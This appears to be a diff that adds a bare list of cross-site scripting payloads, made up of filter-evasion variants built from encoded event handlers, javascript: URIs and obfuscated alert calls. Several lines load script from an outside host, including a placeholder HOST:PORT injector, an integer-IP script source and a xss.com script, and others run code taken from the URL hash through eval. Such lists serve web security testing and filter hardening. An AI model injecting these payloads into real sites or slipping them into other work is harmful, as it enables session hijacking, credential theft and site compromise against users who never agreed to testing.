+<script>alert(1)<!–
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1="1"onxxx=1
+<x </onxxx=1 
+<x 1=">" onxxx=1 
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1=' 
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+<math><brute href=javascript:alert(1)>click 
+<form action=javascript:alert(1)><input type=submit> 
+<isindex action=javascript:alert(1) type=submit value=click> 
+<form><button formaction=javascript:alert(1)>click 
+<form><input formaction=javascript:alert(1) type=submit value=click> 
+<form><input formaction=javascript:alert(1) type=image value=click> 
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+<isindex formaction=javascript:alert(1) type=submit value=click> 
+<object data=javascript:alert(1)> 
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
+<svg><script xlink:href=data:,alert(1) /> 
+<math><brute xlink:href=javascript:alert(1)>click 
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<base href=//0>
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+alert`1`
+alert&lpar;1&rpar;
+alert&#x28;1&#x29
+alert&#40;1&#41
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top['al\x65rt'](1)
+top[8680439..toString(30)](1)
+navigator.vibrate(500)
+eval(URL.slice(-8))>#alert(1)
+eval(location.hash.slice(1)>#alert(1)
+innerHTML=location.hash>#<script>alert(1)</script>
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy="alert(1)" contenteditable>test</a>
+<a oncut="alert(1)" contenteditable>test</a>
+<a ondblclick="alert(1)">test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a onmouseout="alert(1)">test</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseup="alert(1)">test</a>
+<a onpaste="alert(1)" contenteditable>test</a>
+<abbr draggable="true" ondrag="alert(1)">test</abbr>
+<abbr draggable="true" ondragend="alert(1)">test</abbr>
+<abbr draggable="true" ondragenter="alert(1)">test</abbr>
+<abbr draggable="true" ondragleave="alert(1)">test</abbr>
+<abbr draggable="true" ondragstart="alert(1)">test</abbr>
+<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
+<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
+<tfoot onclick="alert(1)">test</tfoot>
+<time onclick="alert(1)">test</time>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+<<scr\0ipt/src=http://xss.com/xss.js></script
+%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
+' onmouseover=alert(/XSS/)
+"><iframe%20src="http://google.com"%%203E
+'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+x”</title><img src%3dx onerror%3dalert(1)>
+<script>+-+-1-+-+alert(1)</script>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+'';!--"<XSS>=&{()}
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<HTML><BODY>
+<? echo('<SCR)';
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+>>> vectors()
+<root/>//["'`-->]]>]</div>
